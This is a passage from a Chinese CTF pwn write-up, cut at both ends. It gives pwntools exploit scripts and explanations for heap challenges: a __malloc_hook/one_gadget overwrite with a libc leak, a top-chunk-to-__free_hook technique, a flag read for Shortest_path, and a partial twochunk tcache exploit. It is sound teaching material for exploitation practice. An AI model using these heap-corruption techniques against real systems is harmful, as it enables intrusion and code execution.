name</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"></code></li><li class="L3"><code class="language-py"><span class="kwd">def</span><span class="pln"> free</span><span class="pun">(</span><span class="pln">index</span><span class="pun">):</span></code></li><li class="L4"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice:'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'3'</span><span class="pun">)</span></code></li><li class="L5"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'item:'</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L6"><code class="language-py"></code></li><li class="L7"><code class="language-py"><span class="kwd">def</span><span class="pln"> exit</span><span class="pun">():</span></code></li><li class="L8"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice:'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'4'</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"></code></li><li class="L1"><code class="language-py"><span class="com">#if __name__ == "__main__":</span></code></li><li class="L2"><code class="language-py"><span class="kwd">for</span><span class="pln"> i </span><span class="kwd">in</span><span class="pln"> range</span><span class="pun">(</span><span class="lit">0x10</span><span class="pun">):</span></code></li><li class="L3"><code class="language-py"><span class="pln">    p </span><span class="pun">=</span><span class="pln"> process</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0x10</span><span class="pun">,</span><span class="pln"> </span><span class="str">'0'</span><span class="pun">)#</span><span class="lit">0</span></code></li><li class="L5"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0x70</span><span class="pun">,</span><span class="pln"> </span><span class="str">'1'</span><span class="pun">)#</span><span class="lit">1</span></code></li><li class="L6"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0x60</span><span class="pun">,</span><span class="pln"> </span><span class="str">'2'</span><span class="pun">)#</span><span class="lit">2</span></code></li><li class="L7"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0x10</span><span class="pun">,</span><span class="pln"> </span><span class="str">'3'</span><span class="pun">)#</span><span class="lit">3</span></code></li><li class="L8"><code class="language-py"></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="pln">    size </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x70</span><span class="pun">+</span><span class="lit">0x10</span><span class="pun">+</span><span class="lit">0x60</span><span class="pun">+</span><span class="lit">0x10</span><span class="pun">+</span><span class="lit">0x1</span></code></li><li class="L1"><code class="language-py"><span class="pln">    change</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x30</span><span class="pun">,</span><span class="pln"> p64</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)*</span><span class="lit">3</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">size</span><span class="pun">))</span></code></li><li class="L2"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">1</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">1</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0x70</span><span class="pun">,</span><span class="pln"> </span><span class="str">'0'</span><span class="pun">)#</span><span class="lit">0</span></code></li><li class="L6"><code class="language-py"><span class="pln">    change</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x100</span><span class="pun">,</span><span class="pln"> </span><span class="str">'\x00'</span><span class="pun">*</span><span class="lit">0x78</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0x71</span><span class="pun">)+</span><span class="str">'\xdd\x65'</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="pln">    </span><span class="com">#gdb.attach(p)</span></code></li><li class="L9"><code class="language-py"><span class="pln">    </span><span class="kwd">try</span><span class="pun">:</span></code></li><li class="L0"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="lit">0x60</span><span class="pun">,</span><span class="pln"> </span><span class="str">'2'</span><span class="pun">)#</span><span class="lit">2</span></code></li><li class="L1"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="lit">0x60</span><span class="pun">,</span><span class="pln"> </span><span class="str">'stderr'</span><span class="pun">)#</span><span class="lit">3</span></code></li><li class="L2"><code class="language-py"><span class="pln">        change</span><span class="pun">(</span><span class="lit">3</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x100</span><span class="pun">,</span><span class="pln"> </span><span class="str">'\x00'</span><span class="pun">*</span><span class="lit">0x3</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)*</span><span class="lit">0x6</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0xfbad1800</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)*</span><span class="lit">0x3</span><span class="pun">+</span><span class="str">'\x00'</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"></code></li><li class="L4"><code class="language-py"><span class="pln">        data </span><span class="pun">=</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">recvuntil</span><span class="pun">(</span><span class="str">'\x7f'</span><span class="pun">)</span></code></li><li class="L5"><code class="language-py"><span class="pln">        libc_base </span><span class="pun">=</span><span class="pln"> u64</span><span class="pun">(</span><span class="pln">data</span><span class="pun">[-</span><span class="lit">6</span><span class="pun">:].</span><span class="pln">ljust</span><span class="pun">(</span><span class="lit">8</span><span class="pun">,</span><span class="str">'\x00'</span><span class="pun">))-</span><span class="lit">0x3c5600</span></code></li><li class="L6"><code class="language-py"><span class="pln">        </span><span class="kwd">print</span><span class="pun">(</span><span class="str">'libc: '</span><span class="pun">+</span><span class="pln">hex</span><span class="pun">(</span><span class="pln">libc_base</span><span class="pun">))</span></code></li><li class="L7"><code class="language-py"><span class="pln">        free_hook </span><span class="pun">=</span><span class="pln"> libc_base </span><span class="pun">+</span><span class="pln"> libc</span><span class="pun">.</span><span class="pln">sym</span><span class="pun">[</span><span class="str">'__free_hook'</span><span class="pun">]</span></code></li><li class="L8"><code class="language-py"><span class="pln">        malloc_hook </span><span class="pun">=</span><span class="pln"> libc_base </span><span class="pun">+</span><span class="pln"> libc</span><span class="pun">.</span><span class="pln">sym</span><span class="pun">[</span><span class="str">'__malloc_hook'</span><span class="pun">]</span></code></li><li class="L9"><code class="language-py"><span class="pln">        realloc </span><span class="pun">=</span><span class="pln"> libc_base </span><span class="pun">+</span><span class="pln"> libc</span><span class="pun">.</span><span class="pln">sym</span><span class="pun">[</span><span class="str">'__libc_realloc'</span><span class="pun">]</span></code></li><li class="L0"><code class="language-py"><span class="pln">        one_gadget </span><span class="pun">=</span><span class="pln"> libc_base </span><span class="pun">+</span><span class="pln"> </span><span class="lit">0x4526a</span></code></li><li class="L1"><code class="language-py"></code></li><li class="L2"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="lit">0x60</span><span class="pun">,</span><span class="pln"> </span><span class="str">'4'</span><span class="pun">)#</span><span class="lit">4</span></code></li><li class="L3"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="lit">0x60</span><span class="pun">,</span><span class="pln"> </span><span class="str">'5'</span><span class="pun">)#</span><span class="lit">5</span></code></li><li class="L4"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="lit">0x60</span><span class="pun">,</span><span class="pln"> </span><span class="str">'6'</span><span class="pun">)#</span><span class="lit">6</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">        free</span><span class="pun">(</span><span class="lit">5</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="pln">        change</span><span class="pun">(</span><span class="lit">3</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x100</span><span class="pun">,</span><span class="pln"> </span><span class="str">'a'</span><span class="pun">*</span><span class="lit">0x88</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0x71</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">malloc_hook</span><span class="pun">-</span><span class="lit">0x23</span><span class="pun">))</span></code></li><li class="L9"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="lit">0x60</span><span class="pun">,</span><span class="pln"> </span><span class="str">'3'</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="lit">0x60</span><span class="pun">,</span><span class="pln"> </span><span class="str">'5'</span><span class="pun">*</span><span class="lit">0xb</span><span class="pun">+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">one_gadget</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">realloc</span><span class="pun">+</span><span class="lit">0xc</span><span class="pun">))</span></code></li><li class="L1"><code class="language-py"></code></li><li class="L2"><code class="language-py"><span class="pln">        sla</span><span class="pun">(</span><span class="str">'choice:'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'1'</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">        sla</span><span class="pun">(</span><span class="str">'name:'</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="lit">100</span><span class="pun">))</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="pln">        p</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li><li class="L6"><code class="language-py"><span class="pln">    </span><span class="kwd">except</span><span class="pun">:</span></code></li><li class="L7"><code class="language-py"><span class="pln">        p</span><span class="pun">.</span><span class="pln">close</span><span class="pun">()</span></code></li></ol></pre><div class="md-section-divider"></div><h3 data-anchor-id="14mh" id="补充-topchunk-和-freehook-利用">补充 top_chunk 和 free_hook 利用</h3><p data-anchor-id="vpcr">劫持<code>__free_hook</code>的思路是，想办法修改<code>top chunk(main_arena+88)</code>指向<code>__free_hook</code>上方某地址(<code>__free_hook-0xb58</code>)，然后多次分配内存，直到<code>__free_hook</code>地址附近，构造长度修改即可。</p><p data-anchor-id="j9fc">修改<code>top chunk</code>地址的方法是： <br>
在<code>__malloc_hook</code>附近找到满足条件的<code>chunk size</code>(<code>__malloc_hook-0x23</code>或<code>__malloc_hook-0x3</code>)。</p><p data-anchor-id="gzak">写入时构造一个<code>chunk header</code>，<code>size</code>为<code>0x70</code>，将<code>0x70</code>的<code>fastbin</code>数组位置（<code>main_arena+48</code>）指向此伪造的堆头。</p><p data-anchor-id="md45">如图 <br>
<img src="http://static.zybuluo.com/leafish/fiw8hzlguct6w4mk2xzb4jsj/image_1e3ef7h6d10v61al4159f8p46k3m.png" alt="image_1e3ef7h6d10v61al4159f8p46k3m.png-29.9kB" title=""></p><p data-anchor-id="4kr3">下一次分配即可分配到<code>main_arena+16</code>位置， 写入到<code>main_arena+88</code>, 写入<code>__free_hook</code>上方某个满足<code>top chunk size</code>条件的位置地址 ，这样<code>top chunk</code>就指向<code>__free_hook</code>上方某位置了。</p><p data-anchor-id="n4ck">在<code>__free_hook</code>上方找一下，<code>__free_hook-0xb58</code>位置有一个符合条件的<code>size</code>，<code>size</code>足够大，满足<code>top chunk</code>条件。</p><p data-anchor-id="8v61"><img src="http://static.zybuluo.com/leafish/dm87f6we8lbvz08xgsksoubf/image_1e3efov151ckqmngalh1loi19v713.png" alt="image_1e3efov151ckqmngalh1loi19v713.png-51.4kB" title=""></p><p data-anchor-id="id1i">然后不断分配<code>chunk</code>，直到<code>__free_hook</code>附近。</p><p data-anchor-id="ub7h">如分配<code>0x90</code>， 对应<code>chunk size</code>为<code>0xa0</code>, 那<code>0xb58/0xa0=18</code>, <code>0xb58-0xa0*18=24</code>。 分配完<code>18个0xa0大小的chunk</code>后，再分配一个<code>chunk</code>，内容写入<code>24-0x10=8</code>个字符即到达<code>__free_hook</code>位置，写入<code>system</code>即可。</p><div class="md-section-divider"></div><h2 data-anchor-id="jvon" id="shortestpath">Shortest_path</h2><div class="md-section-divider"></div><h3 data-anchor-id="ru98" id="解题思路-3">解题思路</h3><p data-anchor-id="e9az">读入的 flag 文件一份存在 .bss 段，一份映射在 heap 中，不断申请堆块，读出 flag 内容</p><p data-anchor-id="7osy"><img src="http://static.zybuluo.com/leafish/a6m91ioa9l9xd0jcuct6cu5h/image_1e3eeat3mq56rv9bqm1udtk599.png" alt="image_1e3eeat3mq56rv9bqm1udtk599.png-279.6kB" title=""></p><div class="md-section-divider"></div><h3 data-anchor-id="8idv" id="exp-4">exp</h3><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="bgio"><ol class="linenums"><li class="L0"><code class="language-py"><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L1"><code class="language-py"><span class="kwd">import</span><span class="pln"> sys</span></code></li><li class="L2"><code class="language-py"><span class="kwd">import</span><span class="pln"> time</span></code></li><li class="L3"><code class="language-py"><span class="pln">context</span><span class="pun">.</span><span class="pln">terminal </span><span class="pun">=</span><span class="pln"> </span><span class="pun">[</span><span class="str">'tmux'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'splitw'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'-h'</span><span class="pun">]</span></code></li><li class="L4"><code class="language-py"><span class="pln">context</span><span class="pun">.</span><span class="pln">log_level </span><span class="pun">=</span><span class="pln"> </span><span class="str">"info"</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">filename </span><span class="pun">=</span><span class="pln"> </span><span class="str">'./Shortest_path'</span></code></li><li class="L7"><code class="language-py"><span class="pln">elf </span><span class="pun">=</span><span class="pln"> ELF</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="com">#libc = ELF('libc.so.6')</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="kwd">if</span><span class="pln"> len</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">)</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> </span><span class="lit">1</span><span class="pun">:</span></code></li><li class="L1"><code class="language-py"><span class="pln">        p </span><span class="pun">=</span><span class="pln"> process</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="kwd">else</span><span class="pun">:</span></code></li><li class="L3"><code class="language-py"><span class="pln">        p </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">1</span><span class="pun">],</span><span class="pln"> int</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">2</span><span class="pun">]))</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="kwd">def</span><span class="pln"> sla</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">):</span></code></li><li class="L6"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="kwd">def</span><span class="pln"> add</span><span class="pun">(</span><span class="pln">id</span><span class="pun">,</span><span class="pln"> length</span><span class="pun">,</span><span class="pln"> name</span><span class="pun">,</span><span class="pln"> member</span><span class="pun">):</span></code></li><li class="L9"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'---&gt; '</span><span class="pun">,</span><span class="pln"> </span><span class="str">'1'</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'ID: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">id</span><span class="pun">))</span></code></li><li class="L1"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'Price: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="lit">0</span><span class="pun">))</span></code></li><li class="L2"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'Length: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">length</span><span class="pun">))</span></code></li><li class="L3"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'Name: \n'</span><span class="pun">,</span><span class="pln"> name</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'station: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">member</span><span class="pun">))</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="kwd">def</span><span class="pln"> query</span><span class="pun">(</span><span class="pln">id</span><span class="pun">):</span></code></li><li class="L7"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'---&gt; '</span><span class="pun">,</span><span class="pln"> </span><span class="str">'3'</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'ID: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">id</span><span class="pun">))</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="kwd">if</span><span class="pln"> __name__ </span><span class="pun">==</span><span class="pln"> </span><span class="str">"__main__"</span><span class="pun">:</span></code></li><li class="L1"><code class="language-py"></code></li><li class="L2"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="lit">0x68</span><span class="pun">,</span><span class="str">'0'</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">1</span><span class="pun">,</span><span class="lit">0x68</span><span class="pun">,</span><span class="str">'1'</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">2</span><span class="pun">,</span><span class="lit">0x68</span><span class="pun">,</span><span class="str">'2'</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L5"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">3</span><span class="pun">,</span><span class="lit">0x48</span><span class="pun">,</span><span class="str">'3'</span><span class="pun">*</span><span class="lit">0x2f</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"></code></li><li class="L7"><code class="language-py"><span class="pln">    query</span><span class="pun">(</span><span class="lit">3</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"></code></li><li class="L9"><code class="language-py"><span class="pln">    p</span><span class="pun">.</span><span class="pln">interactive</span><span class="pun">()</span></code></li></ol></pre><div class="md-section-divider"></div><h2 data-anchor-id="rw5n" id="twochunk">twochunk</h2><div class="md-section-divider"></div><h3 data-anchor-id="nnlf" id="解题思路-4">解题思路</h3><ol data-anchor-id="4p0e">
<li>首先通过唯一<code>malloc</code>泄露堆地址（<code>calloc</code>申请会对堆块置零）</li>
<li>其次把两个<code>0x90</code>块放入<code>smallbin</code>（<code>calloc</code>申请不会找<code>tcachebin</code>)</li>
<li>把<code>0x23333000</code>伪造进<code>tcachebin</code>，并且利用选项五泄露<code>libc</code>地址</li>
<li>利用选项六写入<code>getshell</code>的地址，最后利用选项七执行函数</li>
</ol><div class="md-section-divider"></div><h3 data-anchor-id="8rze" id="exp-5">exp</h3><div class="md-section-divider"></div><pre class="prettyprint linenums prettyprinted" data-anchor-id="ybzd"><ol class="linenums"><li class="L0"><code class="language-py"><span class="kwd">from</span><span class="pln"> pwn </span><span class="kwd">import</span><span class="pln"> </span><span class="pun">*</span></code></li><li class="L1"><code class="language-py"><span class="kwd">import</span><span class="pln"> sys</span></code></li><li class="L2"><code class="language-py"><span class="kwd">import</span><span class="pln"> time</span></code></li><li class="L3"><code class="language-py"><span class="pln">context</span><span class="pun">.</span><span class="pln">terminal </span><span class="pun">=</span><span class="pln"> </span><span class="pun">[</span><span class="str">'tmux'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'splitw'</span><span class="pun">,</span><span class="pln"> </span><span class="str">'-h'</span><span class="pun">]</span></code></li><li class="L4"><code class="language-py"><span class="pln">context</span><span class="pun">.</span><span class="pln">log_level </span><span class="pun">=</span><span class="pln"> </span><span class="str">"debug"</span></code></li><li class="L5"><code class="language-py"></code></li><li class="L6"><code class="language-py"><span class="pln">filename </span><span class="pun">=</span><span class="pln"> </span><span class="str">'./twochunk'</span></code></li><li class="L7"><code class="language-py"><span class="pln">elf </span><span class="pun">=</span><span class="pln"> ELF</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">libc </span><span class="pun">=</span><span class="pln"> ELF</span><span class="pun">(</span><span class="str">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="kwd">if</span><span class="pln"> len</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">)</span><span class="pln"> </span><span class="pun">==</span><span class="pln"> </span><span class="lit">1</span><span class="pun">:</span></code></li><li class="L1"><code class="language-py"><span class="pln">    p </span><span class="pun">=</span><span class="pln"> process</span><span class="pun">(</span><span class="pln">filename</span><span class="pun">)#,</span><span class="pln"> env</span><span class="pun">={</span><span class="str">'LD_PRELOAD_PATH'</span><span class="pun">:</span><span class="str">'./libc.so.6'</span><span class="pun">})</span></code></li><li class="L2"><code class="language-py"><span class="kwd">else</span><span class="pun">:</span></code></li><li class="L3"><code class="language-py"><span class="pln">    p </span><span class="pun">=</span><span class="pln"> remote</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">1</span><span class="pun">],</span><span class="pln"> int</span><span class="pun">(</span><span class="pln">sys</span><span class="pun">.</span><span class="pln">argv</span><span class="pun">[</span><span class="lit">2</span><span class="pun">]))</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="kwd">def</span><span class="pln"> sla</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">):</span></code></li><li class="L6"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">sendlineafter</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"></code></li><li class="L8"><code class="language-py"><span class="kwd">def</span><span class="pln"> sa</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">):</span></code></li><li class="L9"><code class="language-py"><span class="pln">    </span><span class="kwd">return</span><span class="pln"> p</span><span class="pun">.</span><span class="pln">sendafter</span><span class="pun">(</span><span class="pln">x</span><span class="pun">,</span><span class="pln"> y</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"></code></li><li class="L1"><code class="language-py"><span class="kwd">def</span><span class="pln"> start</span><span class="pun">(</span><span class="pln">name</span><span class="pun">,</span><span class="pln"> message</span><span class="pun">):</span></code></li><li class="L2"><code class="language-py"><span class="pln">    sa</span><span class="pun">(</span><span class="str">'name: '</span><span class="pun">,</span><span class="pln"> name</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    sa</span><span class="pun">(</span><span class="str">'message: '</span><span class="pun">,</span><span class="pln"> name</span><span class="pun">)</span></code></li><li class="L4"><code class="language-py"></code></li><li class="L5"><code class="language-py"><span class="kwd">def</span><span class="pln"> add</span><span class="pun">(</span><span class="pln">index</span><span class="pun">,</span><span class="pln"> size</span><span class="pun">):</span></code></li><li class="L6"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice: '</span><span class="pun">,</span><span class="pln"> </span><span class="str">'1'</span><span class="pun">)</span></code></li><li class="L7"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'idx: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L8"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'size: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">size</span><span class="pun">))</span></code></li><li class="L9"><code class="language-py"></code></li><li class="L0"><code class="language-py"><span class="kwd">def</span><span class="pln"> free</span><span class="pun">(</span><span class="pln">index</span><span class="pun">):</span></code></li><li class="L1"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice: '</span><span class="pun">,</span><span class="pln"> </span><span class="str">'2'</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'idx: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L3"><code class="language-py"></code></li><li class="L4"><code class="language-py"><span class="kwd">def</span><span class="pln"> edit</span><span class="pun">(</span><span class="pln">index</span><span class="pun">,</span><span class="pln"> content</span><span class="pun">):</span></code></li><li class="L5"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice: '</span><span class="pun">,</span><span class="pln"> </span><span class="str">'4'</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'idx: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L7"><code class="language-py"><span class="pln">    sa</span><span class="pun">(</span><span class="str">'content: '</span><span class="pun">,</span><span class="pln"> content</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"></code></li><li class="L9"><code class="language-py"><span class="kwd">def</span><span class="pln"> show</span><span class="pun">(</span><span class="pln">index</span><span class="pun">):</span></code></li><li class="L0"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'choice: '</span><span class="pun">,</span><span class="str">'3'</span><span class="pun">)</span></code></li><li class="L1"><code class="language-py"><span class="pln">    sla</span><span class="pun">(</span><span class="str">'idx: '</span><span class="pun">,</span><span class="pln"> str</span><span class="pun">(</span><span class="pln">index</span><span class="pun">))</span></code></li><li class="L2"><code class="language-py"></code></li><li class="L3"><code class="language-py"><span class="kwd">if</span><span class="pln"> __name__ </span><span class="pun">==</span><span class="pln"> </span><span class="str">"__main__"</span><span class="pun">:</span></code></li><li class="L4"><code class="language-py"><span class="pln">    buf_addr </span><span class="pun">=</span><span class="pln"> </span><span class="lit">0x23333000</span></code></li><li class="L5"><code class="language-py"><span class="pln">    start</span><span class="pun">(</span><span class="pln">p64</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)+</span><span class="pln">p64</span><span class="pun">(</span><span class="pln">buf_addr</span><span class="pun">+</span><span class="lit">0x20</span><span class="pun">),</span><span class="pln"> p64</span><span class="pun">(</span><span class="lit">0</span><span class="pun">))</span></code></li><li class="L6"><code class="language-py"></code></li><li class="L7"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="lit">0xe9</span><span class="pun">)</span></code></li><li class="L8"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">1</span><span class="pun">,</span><span class="lit">0xe9</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">1</span><span class="pun">)</span></code></li><li class="L1"><code class="language-py"><span class="pln">    add</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x5b25</span><span class="pun">)</span></code></li><li class="L2"><code class="language-py"><span class="pln">    show</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L3"><code class="language-py"><span class="pln">    heap_addr </span><span class="pun">=</span><span class="pln"> u64</span><span class="pun">(</span><span class="pln">p</span><span class="pun">.</span><span class="pln">recv</span><span class="pun">(</span><span class="lit">8</span><span class="pun">))</span></code></li><li class="L4"><code class="language-py"><span class="pln">    </span><span class="kwd">print</span><span class="pun">(</span><span class="str">'heap: '</span><span class="pun">+</span><span class="pln">hex</span><span class="pun">(</span><span class="pln">heap_addr</span><span class="pun">))</span></code></li><li class="L5"><code class="language-py"><span class="pln">    free</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L6"><code class="language-py"></code></li><li class="L7"><code class="language-py"><span class="pln">    </span><span class="kwd">for</span><span class="pln"> i </span><span class="kwd">in</span><span class="pln"> range</span><span class="pun">(</span><span class="lit">5</span><span class="pun">):</span></code></li><li class="L8"><code class="language-py"><span class="pln">        add</span><span class="pun">(</span><span class="lit">0</span><span class="pun">,</span><span class="pln"> </span><span class="lit">0x88</span><span class="pun">)</span></code></li><li class="L9"><code class="language-py"><span class="pln">        free</span><span class="pun">(</span><span class="lit">0</span><span class="pun">)</span></code></li><li class="L0"><code class="language-py"></code></li><li class="L1"><code class="language-py"><span class="pln"> 